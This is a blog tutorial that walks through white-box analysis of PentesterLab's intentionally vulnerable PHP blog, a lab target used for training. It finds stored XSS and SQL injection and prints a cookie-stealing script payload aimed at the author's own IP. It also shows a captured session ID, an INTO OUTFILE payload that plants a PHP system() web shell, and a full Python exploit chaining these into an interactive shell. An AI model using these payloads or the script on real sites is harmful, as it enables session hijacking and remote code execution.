---
author: "Lazar"
title: "Simple Code Analysis"
date: "2021-07-29"
description: "A great tutorial for those who are just starting white box testing"
tags: ["OSWE", "Code Analysis", "White Box", "XSS", "RCE"]
ShowToc: true
ShowBreadCrumbs: true
---

In today's blog post I'll be doing a **simple** source code analysis of vulnerable web blog made by [PentesterLab](https://pentesterlab.com/exercises/xss_and_mysql_file/course). 

It's a basic PHP web app for learning white box testing, meaning that we have access to all of source code.

## Analysis

The first thing I'll be looking into is `index.php` file:

```php
<?php
  $site = "PentesterLab vulnerable blog";
  require "header.php";
  $posts = Post::all();
?>
  <div class="block" id="block-text">
    <div class="secondary-navigation">
      <div class="content">
      <?php 
    	foreach ($posts as $post) {
            echo $post->render(); 
      } ?> 
     </div>
    </div>
  </div>
<?php

  require "footer.php";
  
?>
```

The `header.php` and `footer.php` files are just generic header and footer templates which have no meaning to us since they don't have any functionality.

Next thing I saw was `$posts = Post::all();` which esentially calls `all` function from `Post` class, and assigning the result to `posts` variable.

Finding `all` function using `grep`:

```bash
 $ grep -Rni 'function all' --color .
./classes/comment.php:16:  function all($post_id=NULL) {
./classes/post.php:13:  function all($cat=NULL,$order =NULL) {
```

**grep arguments**

- i - case insensitive search
- R - recursive search
- n - displays line number
- color - prints the found string in color

It is located in `./classes/post.php` on 13th line:

```php
function all($cat=NULL,$order =NULL) {
    $sql = "SELECT * FROM posts";
    if (isset($order)) 
      $sql .= "order by ".mysql_real_escape_string($order);  
    $results= mysql_query($sql);
    $posts = Array();
    if ($results) {
      while ($row = mysql_fetch_assoc($results)) {
        $posts[] = new Post($row['id'],$row['title'],$row['text'],$row['published']);
      }
    }
    else {
      echo mysql_error();
    }
    return $posts;
  }
```

While looking at this function, I didn't find anything useful to exploit. Moving onto `Post.php` page (not class file!)

```php
<?php
  $site = "PentesterLab vulnerable blog";
  require "header.php";
  $post = Post::find(intval($_GET['id']));
?>
  <div class="block" id="block-text">
    <div class="secondary-navigation">
      <div class="content">
      <?php 
            echo $post->render_with_comments(); 
      ?> 
     </div>

      <form method="POST" action="/post_comment.php?id=<?php echo htmlentities($_GET['id']); ?>"> 
        Title: <input type="text" name="title" / ><br/>
        Author: <input type="text" name="author" / ><br/>
        Text: <textarea name="text" cols="80" rows="5">
        </textarea><br/>
        <input type="submit" name="submit" / >
      </form> 
    </div>

  </div>


<?php

  require "footer.php";
?>

```

First thing that I look for is where user input is obtained and processed. on 4th line we see a call to `find` function from `Post` class:

```php
$post = Post::find(intval($_GET['id']));
```

One argument is being passed to find function, which is actually `id` parameter from **GET** request. Although, it is being sanitized using `intval`  function. Looking into the function behaviour using `php` interpreter on my local machine:

```php
$ php -a 
Interactive mode enabled

php > var_dump(intval("hello"));
int(0)
php > var_dump(intval("5"));
int(5)
php > var_dump(intval("5hello"));
int(5)
```

As you can see, `intval` returns `0` when anything other than integer is passed to it which means the input is properly sanitized. 


![](https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/pic1.png#center)


Looking into `find` function from `Post` class:

```php
function find($id) {
    $result = mysql_query("SELECT * FROM posts where id=".$id);
    $row = mysql_fetch_assoc($result); 
    if (isset($row)){
      $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
    }
    return $post;
  }
```

The `id` variable is direcly passed into query, which means if previous sanitization of input didn't exist, we could've achieved **SQL Injection**.

### The post_comment.php file

```php
<?php
  $site = "PentesterLab vulnerable blog";
  require "header.php";
  $post = Post::find(intval($_GET['id']));
  if (isset($post)) {
    $ret = $post->add_comment();
  }
  header("Location: post.php?id=".intval($_GET['id']));
  die();
?>
```

This file also uses `intval` function to sanitize it's `id` **GET** parameter.

However, it checks if `post` variable is set, and if so, it executes `add_comment` function

```php
function add_comment() {
    $sql  = "INSERT INTO comments (title,author, text, post_id) values ('";
    $sql .= mysql_real_escape_string($_POST["title"])."','";
    $sql .= mysql_real_escape_string($_POST["author"])."','";
    $sql .= mysql_real_escape_string($_POST["text"])."',";
    $sql .= intval($this->id).")";
    $result = mysql_query($sql);
    echo mysql_error(); 
  }
```

Looking at the code above, we see that values from **POST** request are being directly stored into the database without any escaping or encoding.

This may be insecure if DB data is being printed on the page without `htmlentities` or similar encoding.

Looking back at `post.php` file, we saw `render_with_comments` function being called. Looking at the function:

```php
function render_with_comments() {
    $str = "<h2 class=\"title\"><a href=\"/post.php?id=".h($this->id)."\">".h($this->title)."</a></h2>";
    $str.= '<div class="inner" style="padding-left: 40px;">';
    $str.= "<p>".htmlentities($this->text)."</p></div>";   
    $str.= "\n\n<div class='comments'><h3>Comments: </h3>\n<ul>";
    foreach ($this->get_comments() as $comment) {
      $str.= "\n\t<li>".$comment->text."</li>";
    }
    $str.= "\n</ul></div>";
    return $str;
  }
```

We see that the post text is properly encoded using `htmlentities` but the comment text **is not**: 

```php
foreach ($this->get_comments() as $comment) {
      $str.= "\n\t<li>".$comment->text."</li>";
    }
```

The value of `text` is being directly printed without any encoding or filtering, which most likely means we can achieve **Stored XSS**.

![](https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/pic2.png#center)

The payload used in comment text field is:

```html
<img src=x onerror=alert()>
```


### Exfiltrating admin cookie

The payload that I am going to use is:

```javascript
<script>var i = new Image(); i.src = 'http://192.168.138.137/' + escape(document.cookie)</script>
```

This payload will generate an image, and set its `src` attribute to point to my IP address on port 80, where I am listening with `python3` `http.server` module.

```bash
 $ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.138.143 - - [28/Jul/2021 21:26:01] code 404, message File not found
192.168.138.143 - - [28/Jul/2021 21:26:01] "GET /PHPSESSID%3D8h8kt46prtmfkul3q3u3tbqaf3 HTTP/1.1" 404 -
```

Using the above cookie, I was able to log in as admin.

### Finding RCE

The admin can execute **CRUD** (Create, Read, Update, Delete) operations on the blog which involves a lot of communication with the *database*. Let's check some functionalities out:

Looking at file `edit.php`:

```php
<?php 
  require("../classes/auth.php");
  require("header.php");
  require("../classes/db.php");
  require("../classes/phpfix.php");
  require("../classes/post.php");

  $post = Post::find($_GET['id']);
  if (isset($_POST['title'])) {
    $post->update($_POST['title'], $_POST['text']);
  } 
?>
  <form action="edit.php?id=<?php echo htmlentities($_GET['id']);?>" method="POST" enctype="multipart/form-data">
    Title: 
    <input type="text" name="title" value="<?php echo htmlentities($post->title); ?>" /> <br/>
    Text: 
      <textarea name="text" cols="80" rows="5">
        <?php echo htmlentities($post->text); ?>
       </textarea><br/>
    <input type="submit" name="Update" value="Update">
  </form>
<?php
  require("footer.php");
?>
```

I immediately saw that this time `find` function parameter was not using `intval` like previous function calls did. As we found out earlier, the function itself directly embeds the `id` variable into the query, which means we can achieve **SQL Injection**.

### Uploading shell with SQL Injection

The payload I used to upload PHP shell is:

```sql
/admin/edit.php?id=1 union select 1,"<?php system($_REQUEST['cmd']); ?>",3,4 into outfile "/var/www/css/shell.php" -- -
```

Since the root directory of webserver was not writable, which I found out during trial and error, I had to upload the shell to ***css*** directory to get it working.

And we got the **RCE**

![](https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/pic3.png#center)


## Developing Proof of Concept

First things first, let's import some of the libraries which we'll likely going to use:

```python
import requests
import re
import socket
import sys
```

Setting variables and wirting an usage message:

```python
r = requests.Session()

if len(sys.argv) < 3:
    print("Usage: ./" + sys.argv[0] + " [http://target] [your IP] [port to listen on]")
    sys.exit()
target = sys.argv[1]
attacker = sys.argv[2]
```

The exploit function generates the JavaScript XSS payload which will create a new image, set it's `src` attribute to attacker's IP address on the port where the script will listen on.

```python
def exploit():
    port = int(sys.argv[3])
    payload = (
        "<script>var i = new Image(); i.src = 'http://" + attacker + ":" + str(port) + "/' + escape(document.cookie)</script>"
    )
    print("[+] Submitting XSS")
    send(payload, port)
```

After generating XSS payload, it'll call `send` function:

```python
def send(xss, port):
    url = target + "post_comment.php?id=1"
    data = {"title": "Hello world!", "author": "Lazar", "text": xss, "submit": "Submit"}
    out = r.post(url, data=data)
    if out.status_code == 200:
        print("[+] Payload sent successfully!")
        print("[*] Waiting for victim...")
        cookie = listen(port)
        login(cookie)
```

This function submits a comment with XSS payload by making POST request to `post_comment.php` file.

Next thing is to capture the admin's cookie which we'll do by starting a web server using `listen` function:

```python
def listen(port):
    HOST = ""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, port))
        s.listen(1)
        conn, addr = s.accept()
        with conn:
            m = conn.recv(2048)
            print("[+] Capturing cookies...")
            out = re.findall("PHPSESSID\%3D.*HTTP", m.decode("utf-8"))
            out = out[0].replace("PHPSESSID%3D", "").replace("HTTP", "")
            return out.replace("\n", "").replace("\t", "")
```

This function will create simple HTTP server and, using some regex will filter out the PHPSESSID cookie.

Login function will log in as admin, using the previously captured cookie:

```python
def login(cookie):
    url = target + "admin/index.php"
    cookie = "PHPSESSID={}".format(cookie)
    head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cookie": cookie,
    }

    a = r.get(url, headers=head)
    if a.text.find("Administration of my Blog"):
        print("[+] Login Successful")
        upload(r, head)
    else:
        print("[-] Login Failed")
        sys.exit()
```

Uploading the shell using `upload` function:

```python
def upload(r, head):

    url = (target + 'admin/edit.php?id=-1%20union%20select%20"<?php","system($_GET[%27cmd%27]);","?>",";"%20into%20outfile%20"/var/www/css/shell.php"%23')
    r.get(url, headers=head)
    shell_url = url + "css/shell.php"
    test = r.get(shell_url, headers=head)
    if test.text.find("Notice: Undefined index:"):
        print("[+] Shell uploaded")
        interact(r, head)
    else:
        print("[-] Shell upload failed")
        sys.exit()
```

Interacting with shell using `interact` function:

```python
def interact(r, head):
    shell_url = target + "css/shell.php"
    while True:
        cmd = input("$ ")
        if cmd == "exit":
            url = shell_url + "?c=rm shell.php"
            r.get(url)
            sys.exit()
        else:
            url = shell_url + "?cmd={}".format(cmd)
        print(r.get(url, headers=head).text.replace(";", ""))
```

The complete PoC:

```python
#!/usr/bin/env python3
import requests
import re
import socket
import sys

r = requests.Session()

if len(sys.argv) < 3:
    print("Usage: ./" + sys.argv[0] + " [http://target] [your IP] [port to listen on]")
    sys.exit()
	
target = sys.argv[1]
attacker = sys.argv[2]
def exploit():
    port = int(sys.argv[3])
    payload = (
        "<script>var i = new Image(); i.src = 'http://"
        + attacker
        + ":"
        + str(port)
        + "/' + escape(document.cookie)</script>"
    )
    print("[+] Submitting XSS")
    send(payload, port)

def listen(port):
    HOST = ""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, port))
        s.listen(1)
        conn, addr = s.accept()
        with conn:
            m = conn.recv(2048)
            print("[+] Capturing cookies...")
            out = re.findall("PHPSESSID\%3D.*HTTP", m.decode("utf-8"))
            out = out[0].replace("PHPSESSID%3D", "").replace("HTTP", "")
            return out.replace("\n", "").replace("\t", "")

def send(xss, port):
    url = target + "post_comment.php?id=1"
    data = {"title": "Hello world!", "author": "Lazar", "text": xss, "submit": "Submit"}
    out = r.post(url, data=data)
    if out.status_code == 200:
        print("[+] Payload sent successfully!")
        print("[*] Waiting for victim...")
        cookie = listen(port)
        login(cookie)

def login(cookie):
    url = target + "admin/index.php"
    cookie = "PHPSESSID={}".format(cookie)
    head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cookie": cookie,
    }

    a = r.get(url, headers=head)
    if a.text.find("Administration of my Blog"):
        print("[+] Login Successful")
        upload(r, head)
    else:
        print("[-] Login Failed")
        sys.exit()
def upload(r, head):
    url = (
        target
        + 'admin/edit.php?id=-1%20union%20select%20"<?php","system($_GET[%27cmd%27]);","?>",";"%20into%20outfile%20"/var/www/css/shell.php"%23'
    )
    r.get(url, headers=head)
    shell_url = url + "css/shell.php"
    test = r.get(shell_url, headers=head)
    if test.text.find("Notice: Undefined index:"):
        print("[+] Shell uploaded")
        interact(r, head)
    else:
        print("[-] Shell upload failed")
        sys.exit()

def interact(r, head):
    shell_url = target + "css/shell.php"
    while True:
        cmd = input("$ ")
        if cmd == "exit":
            url = shell_url + "?c=rm shell.php"
            r.get(url)
            sys.exit()
        else:
            url = shell_url + "?cmd={}".format(cmd)
        print(r.get(url, headers=head).text.replace(";", ""))
exploit()
```

## Conclusion

This was a nice simple code analysis tutorial helpful to those who are just starting white box testing, like me :)